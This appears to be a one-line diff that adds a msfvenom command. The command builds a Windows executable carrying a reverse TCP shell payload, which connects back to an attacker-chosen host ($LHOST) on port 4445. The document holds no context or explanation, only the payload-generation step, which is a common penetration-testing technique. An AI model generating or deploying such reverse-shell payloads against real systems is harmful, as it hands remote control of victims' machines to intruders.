@@ -1,0 +1,1 @@
+msfvenom --platform windows --format exe --payload windows/shell_reverse_tcp LHOST=$LHOST LPORT=4445 --out rev_${LHOST}_4445.exe
